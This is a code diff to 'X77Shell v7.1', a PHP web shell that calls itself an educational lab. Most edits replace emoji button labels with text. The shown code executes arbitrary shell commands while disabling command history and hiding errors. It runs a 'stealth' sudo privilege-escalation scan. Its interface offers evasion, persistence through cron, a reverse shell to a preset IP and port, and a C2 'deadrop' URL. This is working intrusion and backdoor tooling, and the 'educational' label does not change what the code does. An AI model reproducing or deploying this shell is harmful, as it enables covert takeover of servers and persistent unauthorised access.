@@ -256,7 +256,6 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         if(in_array($raw,['clear','reset'])){echo json_encode(['out'=>'','cwd'=>$cwd,'clear'=>true]);exit;}
         if($raw==='history'){$lines=array_map(fn($i,$v)=>sprintf('%5d  %s',$i+1,$v),array_keys($his),$his);echo json_encode(['out'=>implode("\n",$lines),'cwd'=>$cwd]);exit;}
         $start=microtime(true);
-        // STEALTH: no history, stderr silent
         $cmd = 'unset HISTFILE; set +o history; cd '.escapeshellarg($cwd).' && '.$raw.' 2>/dev/null';
         $proc=proc_open($cmd,[1=>['pipe','w']],$pipes);
         $out=is_resource($proc)?rtrim(stream_get_contents($pipes[1]),"\n"):'Error';
@@ -527,7 +526,6 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         $out .= "AUTO PRIVILEGE ESCALATION SCAN (Stealth Mode)\n";
         $out .= "============================================================\n\n";
         $out .= "[+] SUDO PERMISSIONS:\n";
-        // STEALTH: use timeout and -n to avoid password prompt, fallback to reading sudoers
         $sudo = shell_exec('timeout 2 sudo -n -l 2>/dev/null');
         if($sudo) {
             $out .= $sudo;
@@ -1035,13 +1033,13 @@ if (empty($_SESSION['auth'])) {
     </div>
     <div id="app" style="opacity:0;transition:opacity .4s">
     <div id="hdr">
-    <span id="logo">X77Shell <span style="font-size:8px;font-family:'JetBrains Mono',monospace;opacity:.5">v7+</span></span>
+    <span id="logo">X77Shell <span style="font-size:8px;font-family:'JetBrains Mono',monospace;opacity:.5">v7.1</span></span>
     <div class="dw"><span class="dw-l">Disk</span><span class="dw-v" id="dw-disk">-</span><div class="dw-bar"><div class="dw-fill" id="dw-df" style="width:0%"></div></div></div>
     <div class="dw"><span class="dw-l">Load</span><span class="dw-v" id="dw-load">-</span></div>
     <div class="dw"><span class="dw-l">Uptime</span><span class="dw-v" id="dw-up">-</span></div>
-    <div class="chip hi">👤 <b><?=esc($user)?></b></div>
-    <div class="chip">🖥 <b><?=esc($hostname)?></b></div>
-    <div class="chip">🌐 <b><?=esc($serverip)?></b></div>
+    <div class="chip hi">User: <b><?=esc($user)?></b></div>
+    <div class="chip">Host: <b><?=esc($hostname)?></b></div>
+    <div class="chip">IP: <b><?=esc($serverip)?></b></div>
     <div class="chip">PHP <b><?=esc($phpver)?></b></div>
     <div id="font-ctrl">
     <span>Aa</span>
@@ -1061,20 +1059,20 @@ if (empty($_SESSION['auth'])) {
     <button id="logout-btn" onclick="location='?logout'">⏻ Logout</button>
     </div>
     <div id="nav">
-    <button class="nb on" onclick="sp('terminal',this)">⬛ Terminal</button>
-    <button class="nb"    onclick="sp('files',this)">📁 Files</button>
-    <button class="nb"    onclick="sp('deep',this)">🔬 Deep</button>
-    <button class="nb"    onclick="sp('network',this)">🌐 Network</button>
-    <button class="nb"    onclick="sp('hashing',this)">🔐 Hash</button>
-    <button class="nb"    onclick="sp('strings',this)">🔤 Strings</button>
-    <button class="nb"    onclick="sp('scanner',this)">🔍 CMS</button>
-    <button class="nb"    onclick="sp('security',this)">🛡 Security</button>
-    <button class="nb"    onclick="sp('cve',this)">📋 CVE</button>
-    <button class="nb"    onclick="sp('sysinfo',this)">⚙️ SysInfo</button>
-    <button class="nb"    onclick="sp('cfg',this)">🛠 Config</button>
-    <button class="nb"    onclick="sp('cheatsheet',this)">⌨️ Keys</button>
-    <button class="nb"    onclick="sp('about',this)">ℹ️ About</button>
-    <button class="nb"    onclick="sp('advanced',this)">🚀 Adv</button>
+    <button class="nb on" onclick="sp('terminal',this)">Terminal</button>
+    <button class="nb"    onclick="sp('files',this)">Files</button>
+    <button class="nb"    onclick="sp('deep',this)">Deep</button>
+    <button class="nb"    onclick="sp('network',this)">Network</button>
+    <button class="nb"    onclick="sp('hashing',this)">Hash</button>
+    <button class="nb"    onclick="sp('strings',this)">Strings</button>
+    <button class="nb"    onclick="sp('scanner',this)">CMS</button>
+    <button class="nb"    onclick="sp('security',this)">Security</button>
+    <button class="nb"    onclick="sp('cve',this)">CVE</button>
+    <button class="nb"    onclick="sp('sysinfo',this)">SysInfo</button>
+    <button class="nb"    onclick="sp('cfg',this)">Config</button>
+    <button class="nb"    onclick="sp('cheatsheet',this)">Keys</button>
+    <button class="nb"    onclick="sp('about',this)">About</button>
+    <button class="nb"    onclick="sp('advanced',this)">Advanced</button>
     </div>
     <div id="content">
     <!-- Terminal -->
@@ -1085,14 +1083,14 @@ if (empty($_SESSION['auth'])) {
     <button id="add-tab" onclick="newTab()">+</button>
     </div>
     <div style="margin-left:auto;display:flex;gap:2px;flex-shrink:0">
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleSrch()">🔍</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="clearTerm()">⌧</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" id="wrap-btn" onclick="toggleWrap()" title="Wrap">↩</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="addPin()" title="Pin">📌</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleSplit()" title="Split">⊟</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="exportOutput()" title="Export .txt">💾</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="openPalette()" title="Ctrl+P">⌨️</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleFS('panel-terminal')" title="Fullscreen">⛶</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleSrch()">Find</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="clearTerm()">Clear</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" id="wrap-btn" onclick="toggleWrap()" title="Wrap">Wrap</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="addPin()" title="Pin">Pin</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleSplit()" title="Split">Split</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="exportOutput()" title="Export">Export</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="openPalette()" title="Palette">Palette</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleFS('panel-terminal')" title="Fullscreen">Full</button>
     <span id="queue-badge" style="display:none;font-size:8px;color:var(--w);border:1px solid var(--w);border-radius:3px;padding:1px 5px"></span>
     </div>
     </div>
@@ -1101,8 +1099,8 @@ if (empty($_SESSION['auth'])) {
     <div class="term-pane" id="pane1">
     <div class="cwdb" id="cwdb1">📁 <div class="bc-wrap" id="bc1"></div></div>
     <div class="term-out" id="terminal1">
-    <div class="srch" id="srch1"><input placeholder="cari..." oninput="doSearch(1)"><span class="srch-n" id="srch-n1">0/0</span><button class="fma" onclick="searchNav(1,-1)">▲</button><button class="fma" onclick="searchNav(1,1)">▼</button><button class="fma" onclick="toggleSrch()">✕</button></div>
-    <div class="entry"><div class="eo info">  X77Shell v7+ - Educational Cybersecurity Lab
+    <div class="srch" id="srch1"><input placeholder="search..." oninput="doSearch(1)"><span class="srch-n" id="srch-n1">0/0</span><button class="fma" onclick="searchNav(1,-1)">▲</button><button class="fma" onclick="searchNav(1,1)">▼</button><button class="fma" onclick="toggleSrch()">✕</button></div>
+    <div class="entry"><div class="eo info">  X77Shell v7.1 - Educational Cybersecurity Lab
     Powered by PHP <?=esc($phpver)?> | <?=esc($user)?>@<?=esc($hostname)?>
     Type 'help' for guide. Ctrl+P = command palette.</div></div>
     </div>
@@ -1116,12 +1114,12 @@ if (empty($_SESSION['auth'])) {
     <div class="term-pane" id="pane2">
     <div style="display:flex;gap:2px;align-items:center;flex-shrink:0">
     <span style="font-size:8.5px;color:var(--dim)">Split 2</span>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px;margin-left:auto" onclick="toggleSrch(2)">🔍</button>
-    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="clearTerm(2)">⌧</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px;margin-left:auto" onclick="toggleSrch(2)">Find</button>
+    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="clearTerm(2)">Clear</button>
     </div>
     <div class="cwdb" id="cwdb2">📁 <div class="bc-wrap" id="bc2"></div></div>
     <div class="term-out" id="terminal2">
-    <div class="srch" id="srch2"><input placeholder="cari..." oninput="doSearch(2)"><span class="srch-n" id="srch-n2">0/0</span><button class="fma" onclick="searchNav(2,-1)">▲</button><button class="fma" onclick="searchNav(2,1)">▼</button><button class="fma" onclick="toggleSrch(2)">✕</button></div>
+    <div class="srch" id="srch2"><input placeholder="search..." oninput="doSearch(2)"><span class="srch-n" id="srch-n2">0/0</span><button class="fma" onclick="searchNav(2,-1)">▲</button><button class="fma" onclick="searchNav(2,1)">▼</button><button class="fma" onclick="toggleSrch(2)">✕</button></div>
     <div class="entry"><div class="eo info">Split terminal 2 ready.</div></div>
     </div>
     <div class="inbar">
@@ -1139,8 +1137,8 @@ if (empty($_SESSION['auth'])) {
     <div id="fm-bread">-</div>
     <div id="fm-vt"><button class="fvb on" id="fvb-l" onclick="setFmV('list')">☰</button><button class="fvb" id="fvb-g" onclick="setFmV('grid')">⊞</button></div>
     <button class="tb2" onclick="fmRefresh()">↺</button>
-    <button class="tb2" onclick="showOverlay('upload-ov')">⬆</button>
-    <button class="tb2" onclick="toggleFS('panel-files')">⛶</button>
+    <button class="tb2" onclick="showOverlay('upload-ov')">Upload</button>
+    <button class="tb2" onclick="toggleFS('panel-files')">Full</button>
     </div>
     <div id="fm-goto-row">
     <input id="fm-goto-input" placeholder="Go to directory path..." onkeydown="if(event.key==='Enter') fmGoto()">
@@ -1156,9 +1154,9 @@ if (empty($_SESSION['auth'])) {
     </div>
     <div id="bulk-bar">
     <span id="bulk-count">0 selected</span>
-    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkDel()">🗑 Del</button>
-    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkChmod('775')">🔒 775</button>
-    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkChmod('444')">🔏 444</button>
+    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkDel()">Del</button>
+    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkChmod('775')">Lock 775</button>
+    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkChmod('444')">Lock 444</button>
     <button class="tb2" style="font-size:8px;padding:2px 6px;border-color:var(--d);color:var(--d)" onclick="clearSel()">✕</button>
     </div>
     <div style="display:flex;flex:1;min-height:0;gap:4px">
@@ -1176,21 +1174,21 @@ if (empty($_SESSION['auth'])) {
     <!-- Deep -->
     <div class="panel" id="panel-deep">
     <div class="dgrid">
-    <div class="dcard"><div class="tt">🔍 Deep Search</div>
+    <div class="dcard"><div class="tt">Deep Search</div>
     <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="ds-dir" placeholder="<?=esc($cwd)?>"></div><div class="tf"><label>Query</label><input class="ti" id="ds-q" placeholder="search..."></div></div>
     <div class="trow"><div class="tf"><label>Mode</label><select class="ti" id="ds-t"><option value="content">File content</option><option value="name">File name</option><option value="perm">Permission</option></select></div><div class="tf"><label>Ext</label><input class="ti" id="ds-e" placeholder="php,js..."></div><button class="tb2" onclick="doDS()">Search</button></div>
     <div class="rbox" id="ds-r">-</div></div>
-    <div class="dcard"><div class="tt">📂 Deep Scan</div>
+    <div class="dcard"><div class="tt">Deep Scan</div>
     <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="dsc-d" placeholder="<?=esc($cwd)?>"></div><div class="tf"><label>Depth</label><select class="ti" id="dsc-dep"><option value="2">2</option><option value="3" selected>3</option><option value="5">5</option><option value="10">10</option></select></div><button class="tb2" onclick="doDScan()">Scan</button></div>
     <div class="rbox" id="dsc-r">-</div></div>
-    <div class="dcard"><div class="tt">📊 Deep Analysis</div>
+    <div class="dcard"><div class="tt">Deep Analysis</div>
     <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="da-d" placeholder="<?=esc($cwd)?>"></div><button class="tb2" onclick="doDA()">Analyze</button></div>
     <div class="rbox" id="da-r">-</div></div>
-    <div class="dcard"><div class="tt">👁 Deep Monitor</div>
+    <div class="dcard"><div class="tt">Deep Monitor</div>
     <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="dm-d" placeholder="<?=esc($cwd)?>"></div></div>
-    <div class="trow"><button class="tb2" onclick="doSnap()">📸 Snapshot</button><button class="tb2" onclick="doSnapChk()">🔄 Check</button></div>
+    <div class="trow"><button class="tb2" onclick="doSnap()">Snapshot</button><button class="tb2" onclick="doSnapChk()">Check</button></div>
     <div class="rbox" id="dm-r">Take snapshot first.</div></div>
-    <div class="dcard"><div class="tt">🔀 Diff Viewer</div>
+    <div class="dcard"><div class="tt">Diff Viewer</div>
     <div class="trow"><div class="tf"><label>File 1</label><input class="ti" id="diff-f1" placeholder="path/to/file1"></div><div class="tf"><label>File 2</label><input class="ti" id="diff-f2" placeholder="path/to/file2"></div><button class="tb2" onclick="doDiff()">Diff</button></div>
     <div class="rbox" id="diff-r" style="font-family:inherit">-</div></div>
     </div>
@@ -1198,13 +1196,13 @@ if (empty($_SESSION['auth'])) {
     <!-- Network -->
     <div class="panel" id="panel-network">
     <div class="tbox">
-    <div class="tt">🔎 Whois</div>
+    <div class="tt">Whois</div>
     <div class="trow"><div class="tf"><label>Domain/IP</label><input class="ti" id="w-d" placeholder="example.com"></div><button class="tb2" onclick="doWhois()">Lookup</button></div>
     <div class="rbox" id="w-r">-</div>
-    <div class="tt">🔄 Reverse IP</div>
+    <div class="tt">Reverse IP</div>
     <div class="trow"><div class="tf"><label>IP</label><input class="ti" id="ri-i" placeholder="1.2.3.4"></div><button class="tb2" onclick="doRIP()">Resolve</button></div>
     <div class="rbox" id="ri-r">-</div>
-    <div class="tt">📡 Port Scanner</div>
+    <div class="tt">Port Scanner</div>
     <div class="trow"><div class="tf"><label>Host</label><input class="ti" id="ps-h" placeholder="localhost"></div><div class="tf"><label>Ports</label><input class="ti" id="ps-p" value="21,22,80,443,3306,8080"></div><button class="tb2" onclick="doPScan()">Scan</button></div>
     <div class="rbox" id="ps-r">-</div>
     </div>
@@ -1212,10 +1210,10 @@ if (empty($_SESSION['auth'])) {
     <!-- Hash -->
     <div class="panel" id="panel-hashing">
     <div class="tbox">
-    <div class="tt">🔐 Hash Generator</div>
+    <div class="tt">Hash Generator</div>
     <div class="trow"><div class="tf"><label>Input</label><input class="ti" id="hg-i" placeholder="text..."></div><button class="tb2" onclick="doHashGen()">Generate</button></div>
     <div class="rbox" id="hg-r">-</div>
-    <div class="tt">🧬 Hash Identifier</div>
+    <div class="tt">Hash Identifier</div>
     <div class="trow"><div class="tf"><label>Hash</label><input class="ti" id="hi-i" placeholder="paste hash..."></div><button class="tb2" onclick="doHashID()">Identify</button></div>
     <div class="rbox" id="hi-r">-</div>
     </div>
@@ -1223,7 +1221,7 @@ if (empty($_SESSION['auth'])) {
     <!-- Strings -->
     <div class="panel" id="panel-strings">
     <div class="tbox">
-    <div class="tt">🔤 String Tools</div>
+    <div class="tt">String Tools</div>
     <div class="tf"><label>Input</label><textarea class="ti ta" id="st-i" rows="3" placeholder="text..."></textarea></div>
     <div class="trow" style="flex-wrap:wrap;gap:3px">
     <?php foreach(['b64enc'=>'B64 Enc','b64dec'=>'B64 Dec','urlencode'=>'URL Enc','urldecode'=>'URL Dec','htmlenc'=>'HTML Enc','htmldec'=>'HTML Dec','hexenc'=>'Hex Enc','hexdec'=>'Hex Dec','md5'=>'MD5','rot13'=>'ROT13','upper'=>'UPPER','lower'=>'lower','reverse'=>'Reverse','strlen'=>'Len','wordcount'=>'Words'] as $k=>$v) echo "<button class='tb2' style='font-size:8px;padding:3px 7px' onclick='doStr(\"$k\")'>{$v}</button>"; ?>
@@ -1234,10 +1232,10 @@ if (empty($_SESSION['auth'])) {
     <!-- CMS -->
     <div class="panel" id="panel-scanner">
     <div class="tbox">
-    <div class="tt">🔍 CMS Detector</div>
+    <div class="tt">CMS Detector</div>
     <div class="trow"><div class="tf"><label>URL</label><input class="ti" id="cm-u" placeholder="https://example.com"></div><button class="tb2" onclick="doCMS()">Detect</button></div>
     <div class="rbox" id="cm-r">-</div>
-    <div class="tt">⚙️ Disable Functions</div>
+    <div class="tt">Disable Functions</div>
     <button class="tb2" onclick="doDF()" style="align-self:flex-start">Check</button>
     <div class="rbox" id="df-r">-</div>
     </div>
@@ -1245,23 +1243,23 @@ if (empty($_SESSION['auth'])) {
     <!-- Security -->
     <div class="panel" id="panel-security">
     <div class="dgrid">
-    <div class="dcard"><div class="tt">🔒 Permission Auditor</div>
+    <div class="dcard"><div class="tt">Permission Auditor</div>
     <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="pa-d" placeholder="<?=esc($cwd)?>"></div><button class="tb2" onclick="doPermAudit()">Audit</button></div>
     <div class="rbox" id="pa-r">-</div></div>
-    <div class="dcard"><div class="tt">📋 Log Analyzer</div>
+    <div class="dcard"><div class="tt">Log Analyzer</div>
     <div class="trow"><div class="tf"><label>Log File</label><select class="ti" id="la-f"><option value="/var/log/apache2/access.log">Apache Access</option><option value="/var/log/apache2/error.log">Apache Error</option><option value="/var/log/nginx/access.log">Nginx Access</option><option value="/var/log/auth.log">Auth Log</option><option value="/var/log/syslog">Syslog</option></select></div><button class="tb2" onclick="doLogAn()">Analyze</button></div>
     <input class="ti" id="la-c" placeholder="or custom path..." style="font-size:9px;margin-top:2px">
     <div class="rbox" id="la-r">-</div></div>
-    <div class="dcard"><div class="tt">🚨 Brute Force Detector</div>
+    <div class="dcard"><div class="tt">Brute Force Detector</div>
     <div class="trow"><div class="tf"><label>Auth Log</label><select class="ti" id="bf-f"><option value="/var/log/auth.log">auth.log (Debian)</option><option value="/var/log/secure">secure (CentOS)</option><option value="/var/log/messages">messages</option></select></div><button class="tb2" onclick="doBF()">Detect</button></div>
     <div class="rbox" id="bf-r">-</div></div>
-    <div class="dcard"><div class="tt">🌐 HTTP Security Headers</div>
+    <div class="dcard"><div class="tt">HTTP Security Headers</div>
     <div class="trow"><div class="tf"><label>URL</label><input class="ti" id="hh-u" placeholder="https://example.com"></div><button class="tb2" onclick="doHTTPH()">Check</button></div>
     <div class="rbox" id="hh-r">-</div></div>
-    <div class="dcard"><div class="tt">🔐 SSL/TLS Certificate</div>
+    <div class="dcard"><div class="tt">SSL/TLS Certificate</div>
     <div class="trow"><div class="tf"><label>Hostname</label><input class="ti" id="ssl-h" placeholder="example.com"></div><button class="tb2" onclick="doSSL()">Check</button></div>
     <div class="rbox" id="ssl-r">-</div></div>
-    <div class="dcard"><div class="tt">✅ PHP Security Checklist</div>
+    <div class="dcard"><div class="tt">PHP Security Checklist</div>
     <button class="tb2" onclick="doSecCL()" style="align-self:flex-start">Run Checklist</button>
     <div class="rbox" id="sc-r">-</div></div>
     </div>
@@ -1270,13 +1268,13 @@ if (empty($_SESSION['auth'])) {
     <div class="panel" id="panel-cve">
     <div style="display:flex;flex-direction:column;flex:1;min-height:0;gap:5px">
     <div class="cve-tabs">
-    <button class="cve-tab on" onclick="cveTab('lookup',this)">🔎 Lookup by ID</button>
-    <button class="cve-tab" onclick="cveTab('search',this)">🔍 Search</button>
-    <button class="cve-tab" onclick="cveTab('recent',this)">🆕 Terbaru</button>
+    <button class="cve-tab on" onclick="cveTab('lookup',this)">Lookup by ID</button>
+    <button class="cve-tab" onclick="cveTab('search',this)">Search</button>
+    <button class="cve-tab" onclick="cveTab('recent',this)">Terbaru</button>
     </div>
     <div id="cvep-lookup" style="display:flex;flex-direction:column;gap:5px;flex:1;min-height:0">
     <div class="tbox" style="flex:unset">
-    <div class="tt">🔎 CVE Lookup - NVD/NIST API</div>
+    <div class="tt">CVE Lookup - NVD/NIST API</div>
     <div class="trow"><div class="tf"><label>CVE ID</label><input class="ti" id="cve-id" placeholder="CVE-2024-1234" onkeydown="if(event.key==='Enter')doCVEL()"></div><button class="tb2" onclick="doCVEL()">Lookup</button></div>
     <div style="font-size:8px;color:var(--dim)">Real-time from nvd.nist.gov | Ctrl+Shift+C = quick lookup</div>
     </div>
@@ -1284,15 +1282,15 @@ if (empty($_SESSION['auth'])) {
     </div>
     <div id="cvep-search" style="display:none;flex-direction:column;gap:5px;flex:1;min-height:0">
     <div class="tbox" style="flex:unset">
-    <div class="tt">🔍 CVE Search by Keyword</div>
+    <div class="tt">CVE Search by Keyword</div>
     <div class="trow"><div class="tf"><label>Keyword</label><input class="ti" id="cve-kw" placeholder="nginx, apache, php..." onkeydown="if(event.key==='Enter')doCVES()"></div><div class="tf"><label>Tahun</label><input class="ti" id="cve-yr" placeholder="2024" type="number"></div><div class="tf"><label>Severity</label><select class="ti" id="cve-sv"><option value="">Semua</option><option value="CRITICAL">CRITICAL</option><option value="HIGH">HIGH</option><option value="MEDIUM">MEDIUM</option><option value="LOW">LOW</option></select></div><button class="tb2" onclick="doCVES()">Search</button></div>
     </div>
     <div class="rbox" id="cve-s-r" style="flex:1;max-height:none;min-height:80px">-</div>
     </div>
     <div id="cvep-recent" style="display:none;flex-direction:column;gap:5px;flex:1;min-height:0">
     <div class="tbox" style="flex:unset">
-    <div class="tt">🆕 20 CVE Terbaru (Realtime NVD)</div>
-    <div style="display:flex;gap:6px;align-items:center"><button class="tb2" onclick="doCVER()">↺ Load</button><span style="font-size:8px;color:var(--dim)">Click CVE ID to lookup detail</span></div>
+    <div class="tt">20 CVE Terbaru (Realtime NVD)</div>
+    <div style="display:flex;gap:6px;align-items:center"><button class="tb2" onclick="doCVER()">Load</button><span style="font-size:8px;color:var(--dim)">Click CVE ID to lookup detail</span></div>
     </div>
     <div class="rbox" id="cve-r-r" style="flex:1;max-height:none;min-height:80px">Click Load to fetch latest CVEs.</div>
     </div>
@@ -1301,7 +1299,7 @@ if (empty($_SESSION['auth'])) {
     <!-- SysInfo -->
     <div class="panel" id="panel-sysinfo">
     <div class="tbox">
-    <div class="tt">📊 System Dashboard</div>
+    <div class="tt">System Dashboard</div>
     <div class="si-grid">
     <div class="si-c"><label>PHP</label><p><?=esc($phpver)?></p></div>
     <div class="si-c"><label>Host</label><p><?=esc($hostname)?></p></div>
@@ -1314,17 +1312,17 @@ if (empty($_SESSION['auth'])) {
     <div class="si-c"><label>Upload Max</label><p><?=ini_get('upload_max_filesize')?></p></div>
     <div class="si-c"><label>OS</label><p><?=esc($os)?></p></div>
     </div>
-    <button class="tb2" onclick="doSI()" style="align-self:flex-start;margin-top:4px">↺ Refresh</button>
+    <button class="tb2" onclick="doSI()" style="align-self:flex-start;margin-top:4px">Refresh</button>
     <div class="rbox" id="si-r" style="font-size:9px">-</div>
-    <div class="tt">🔌 PHP Extensions</div>
+    <div class="tt">PHP Extensions</div>
     <div class="rbox" id="si-ext">-</div>
-    <div class="tt">⚙️ Processes</div>
+    <div class="tt">Processes</div>
     <button class="tb2" onclick="doPS()" style="align-self:flex-start">Load</button>
     <div class="rbox" id="si-ps">-</div>
-    <div class="tt">📋 Activity Log</div>
-    <button class="tb2" onclick="loadLog()" style="align-self:flex-start">↺ Load</button>
+    <div class="tt">Activity Log</div>
+    <button class="tb2" onclick="loadLog()" style="align-self:flex-start">Load</button>
     <div id="alog"><div style="color:var(--dim);font-size:8.5px">Click Load...</div></div>
-    <div class="tt">🔑 Change Password</div>
+    <div class="tt">Change Password</div>
     <div class="trow">
     <div class="tf"><label>Old</label><input class="ti" type="password" id="cp-o"></div>
     <div class="tf"><label>New (min 6)</label><input class="ti" type="password" id="cp-n"></div>
@@ -1335,16 +1333,16 @@ if (empty($_SESSION['auth'])) {
     <!-- Config -->
     <div class="panel" id="panel-cfg">
     <div class="tbox">
-    <div class="tt">🛠 Command Aliases</div>
+    <div class="tt">Command Aliases</div>
     <div class="trow"><div class="tf"><label>Alias</label><input class="ti" id="al-n" placeholder="ll"></div><div class="tf"><label>Command</label><input class="ti" id="al-c" placeholder="ls -la"></div><button class="tb2" onclick="addAlias()">+ Add</button></div>
     <div id="alias-list"></div>
-    <div class="tt">📌 Pinned Commands</div>
+    <div class="tt">Pinned Commands</div>
     <div class="trow"><div class="tf"><label>Command</label><input class="ti" id="pin-c" placeholder="ls -la /var/www"></div><button class="tb2" onclick="addPinM()">+ Pin</button></div>
     <div id="pin-list"></div>
-    <div class="tt">⏳ Command Queue</div>
+    <div class="tt">Command Queue</div>
     <div class="trow"><div class="tf"><label>Command</label><input class="ti" id="q-c" placeholder="ls -la"></div><button class="tb2" onclick="addQ(document.getElementById('q-c').value.trim());document.getElementById('q-c').value=''">+ Queue</button><button class="tb2" style="border-color:var(--d);color:var(--d)" onclick="clearQ()">Clear</button></div>
     <div id="queue-list"></div>
-    <div class="tt">🔐 Security Info</div>
+    <div class="tt">Security Info</div>
     <div class="rbox" style="font-size:8.5px">Client IP: <b><?=esc($_SERVER['REMOTE_ADDR'])?></b>
     CSRF Token: <b>Active</b> | Rate Limit: <b>Active</b> | Session FP: <b>Active</b>
     IP Whitelist: <b><?=empty($IP_WHITELIST)?'OFF':'ON - '.implode(', ',$IP_WHITELIST)?></b>
@@ -1354,7 +1352,7 @@ if (empty($_SESSION['auth'])) {
     <!-- Cheatsheet -->
     <div class="panel" id="panel-cheatsheet">
     <div class="tbox">
-    <div class="tt">⌨️ Shortcuts & Commands</div>
+    <div class="tt">Shortcuts & Commands</div>
     <div id="cs-grid">
     <div class="cs-s"><h3>Terminal</h3>
     <div class="cs-r"><span class="cs-k">Ctrl+R</span><span class="cs-d">History search</span></div>
@@ -1416,9 +1414,9 @@ if (empty($_SESSION['auth'])) {
     <!-- About -->
     <div class="panel" id="panel-about">
     <div class="tbox">
-    <div class="tt">ℹ️ X77Shell PRO v7</div>
+    <div class="tt">About X77Shell PRO v7</div>
     <div class="ag">
-    <div class="ac2"><label>Shell</label><p>X77Shell PRO v7+</p></div>
+    <div class="ac2"><label>Shell</label><p>X77Shell PRO v7.1</p></div>
     <div class="ac2"><label>User</label><p><?=esc($user)?></p></div>
     <div class="ac2"><label>Sys User</label><p><?=esc($sysuser)?></p></div>
     <div class="ac2"><label>Hostname</label><p><?=esc($hostname)?></p></div>
@@ -1438,162 +1436,162 @@ if (empty($_SESSION['auth'])) {
     <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px;flex:1;overflow-y:auto;padding:4px">
     <!-- Stealth -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:var(--a3);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🕵️ Stealth</div>
-    <button class="tb2" onclick="advAct('adv_stealth_evasion')">🧹 Evasion</button>
+    <div style="color:var(--a3);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Stealth</div>
+    <button class="tb2" onclick="advAct('adv_stealth_evasion')">Evasion</button>
     <div style="margin-top:4px;display:flex;gap:3px;flex-wrap:wrap">
     <input class="ti" id="adv-msg" placeholder="Message" style="font-size:9px;padding:3px 5px;flex:1">
-    <button class="tb2" onclick="advEncrypt()">🔐 Encrypt</button>
+    <button class="tb2" onclick="advEncrypt()">Encrypt</button>
     </div>
     <div class="rbox" id="adv-stealth-out" style="font-size:8px;max-height:80px;min-height:30px">-</div>
     </div>
     <!-- Persistence -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:var(--w);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">⚡ Persistence</div>
+    <div style="color:var(--w);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Persistence</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
     <input class="ti" id="adv-rip" placeholder="IP" style="width:80px;font-size:9px;padding:2px 4px" value="192.168.1.100">
     <input class="ti" id="adv-rport" placeholder="Port" style="width:50px;font-size:9px;padding:2px 4px" value="4444">
-    <button class="tb2" onclick="advReverse()">↺ Reverse</button>
+    <button class="tb2" onclick="advReverse()">Reverse</button>
     </div>
     <div style="display:flex;gap:3px;flex-wrap:wrap;margin-top:3px">
     <input class="ti" id="adv-ccmd" placeholder="Command" style="flex:1;font-size:9px;padding:2px 4px">
     <input class="ti" id="adv-csch" placeholder="*/10" style="width:50px;font-size:9px;padding:2px 4px" value="*/10">
-    <button class="tb2" onclick="advCron()">⏰ Cron</button>
+    <button class="tb2" onclick="advCron()">Cron</button>
     </div>
     <div style="display:flex;gap:3px;margin-top:3px">
     <input class="ti" id="adv-durl" placeholder="C2 URL" style="flex:1;font-size:9px;padding:2px 4px">
-    <button class="tb2" onclick="advDeadrop()">📦 Deadrop</button>
+    <button class="tb2" onclick="advDeadrop()">Deadrop</button>
     </div>
     <div class="rbox" id="adv-persist-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
     </div>
     <!-- Resilience -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:var(--a2);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🛡️ Resilience</div>
+    <div style="color:var(--a2);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Resilience</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
     <input class="ti" id="adv-dnsd" placeholder="Data" style="flex:1;font-size:9px;padding:2px 4px" value="test">
